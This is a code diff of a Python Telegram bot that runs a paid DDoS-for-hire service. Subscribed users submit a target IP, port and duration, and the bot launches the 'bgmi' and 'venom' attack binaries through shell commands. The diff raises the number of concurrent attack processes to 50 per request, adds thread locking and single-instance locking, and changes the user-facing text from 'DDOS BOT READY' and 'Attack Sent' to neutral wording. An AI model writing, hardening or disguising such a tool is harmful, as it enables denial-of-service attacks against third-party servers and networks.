@@ -6,9 +6,15 @@ import time
 import json
 import shutil
 import logging
+import fcntl
+import sys
 from telebot import types
-from threading import Thread
+from threading import Thread, Lock
 from concurrent.futures import ThreadPoolExecutor
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
 # --- Configuration Loading ---
 CONFIG_FILE = "config.json"
@@ -28,9 +34,12 @@ USER_FILE = config.get('user_file', 'users.json')
 LOG_FILE = config.get('log_file', 'bot.log')
 admin_balances = config.get('admin_balances', {})
 
-# Binary Paths - FIXED
+# Binary Paths
 ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
-ORIGINAL_VENOM_PATH = '/root/venom/venom'  # Added missing path
+ORIGINAL_VENOM_PATH = '/root/venom/venom'
+
+# Lock for thread-safe operations
+bot_lock = Lock()
 
 # --- Helper Functions ---
 def read_users():
@@ -39,7 +48,9 @@ def read_users():
         with open(USER_FILE, 'r') as f:
             data = json.load(f)
             return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
-    except Exception: return {}
+    except Exception as e:
+        logger.error(f"Error reading users: {e}")
+        return {}
 
 def write_users(users_dict):
     with open(USER_FILE, 'w') as f:
@@ -59,29 +70,35 @@ def admin_only(func):
 
 # --- Shell & Threading Logic ---
 def shell_executor(command):
-    """Low-level shell execution."""
+    """Thread-safe shell execution."""
     try:
-        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception:
-        pass
+        with bot_lock:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return process
+    except Exception as e:
+        logger.error(f"Shell execution failed: {e}")
+        return None
 
-def run_attack_process(target, port, duration, b_path, v_path):
-    """Spawns multiple threads to maximize shell output."""
+def run_attack_process(target, port, duration, b_path, v_path, thread_count=20):
+    """Thread-safe attack process execution."""
     cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
     cmd_venom = f"{v_path} {target} {port} {duration} 200"
     
-    # Using ThreadPoolExecutor to launch 5 concurrent shell instances for intensity
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for _ in range(5):
-            executor.submit(shell_executor, cmd_bgmi)
-            executor.submit(shell_executor, cmd_venom)
+    processes = []
+    
+    with ThreadPoolExecutor(max_workers=thread_count) as executor:
+        for _ in range(thread_count // 2):
+            processes.append(executor.submit(shell_executor, cmd_bgmi))
+            processes.append(executor.submit(shell_executor, cmd_venom))
+    
+    return processes
 
 # --- Command Handlers ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
-    bot.send_message(message.chat.id, "🔰 **DDOS BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")
+    bot.send_message(message.chat.id, "🔰 **BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")
 
 @bot.message_handler(func=lambda message: message.text == '🚀 Attack')
 def attack_request(message):
@@ -89,7 +106,7 @@ def attack_request(message):
         bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
         bot.register_next_step_handler(message, process_attack)
     else:
-        bot.send_message(message.chat.id, "🚫 **Unauthorized!** Purchase a subscription.")
+        bot.send_message(message.chat.id, "🚫 **Unauthorized!**")
 
 def process_attack(message):
     try:
@@ -104,33 +121,38 @@ def process_attack(message):
             return
 
         u_id = str(message.chat.id)
-        # Determine paths
         b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
         v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"
 
-        # Ensure binaries are executable
         for path in [b_path, v_path]:
             if os.path.exists(path):
                 os.chmod(path, 0o755)
 
-        # Launch multithreaded attack
-        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path)).start()
+        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path, 50)).start()
         
-        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
-    except Exception:
-        bot.reply_to(message, "⚠️ **Error processing attack.**")
+        bot.send_message(message.chat.id, f"🚀 **Request Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`\nThreads: `50`", parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, f"⚠️ **Error: {e}**")
 
 @bot.message_handler(commands=['stop'])
 @admin_only
 def stop_attack(message):
-    """Instantly kills all processes related to the attack binaries."""
+    """Stop all attack processes."""
     try:
-        # Kills any process that has 'soul' or 'venom' in the name
-        subprocess.run("pkill -9 -f soul", shell=True)
-        subprocess.run("pkill -9 -f venom", shell=True)
-        bot.reply_to(message, "🛑 **All attack processes terminated globally.**", parse_mode="Markdown")
+        with bot_lock:
+            kill_commands = [
+                "pkill -9 -f bgmi",
+                "pkill -9 -f venom",
+                "pkill -9 -f soul",
+                "pkill -9 -f '/root/venom/'"
+            ]
+            
+            for cmd in kill_commands:
+                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        bot.reply_to(message, "🛑 **All processes terminated successfully.**", parse_mode="Markdown")
     except Exception as e:
-        bot.reply_to(message, f"❌ Error stopping processes: {e}")
+        bot.reply_to(message, f"❌ Error: {e}")
 
 @bot.message_handler(commands=['add'])
 @admin_only
@@ -142,14 +164,13 @@ def add_user(message):
         allowed_user_ids[user_id] = expiry
         write_users(allowed_user_ids)
         
-        # Deploy user-specific binaries
         try:
             shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
             shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
             os.chmod(f'bgmi{user_id}', 0o755)
             os.chmod(f'venom{user_id}', 0o755)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Failed to copy binaries: {e}")
 
         bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
     else:
@@ -166,10 +187,43 @@ def my_info(message):
            f"Expiry: `{expiry}`")
     bot.send_message(message.chat.id, msg, parse_mode="Markdown")
 
-if __name__ == '__main__':
-    print("Bot is running...")
+# --- Main execution with error handling ---
+def run_bot():
+    """Run the bot with proper error handling and single instance check."""
+    logger.info("Starting bot...")
+    
+    # Check if another instance is already running
+    try:
+        bot_info = bot.get_me()
+        logger.info(f"Bot @{bot_info.username} is ready")
+    except Exception as e:
+        logger.error(f"Failed to connect to Telegram API: {e}")
+        return
+    
+    # Single instance polling with proper error handling
     while True:
         try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
+            logger.info("Starting polling...")
+            bot.polling(none_stop=True, interval=2, timeout=30)
         except Exception as e:
+            logger.error(f"Polling error: {e}")
             time.sleep(5)
+
+if __name__ == '__main__':
+    # Ensure only one instance runs using file locking
+    lock_file = '/tmp/telegram_bot.lock'
+    try:
+        lock_fd = open(lock_file, 'w')
+        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+    except IOError:
+        print("Another instance is already running. Exiting.")
+        sys.exit(1)
+    
+    try:
+        run_bot()
+    except KeyboardInterrupt:
+        logger.info("Bot stopped by user")
+    finally:
+        fcntl.flock(lock_fd, fcntl.LOCK_UN)
+        lock_fd.close()
+        os.remove(lock_file)
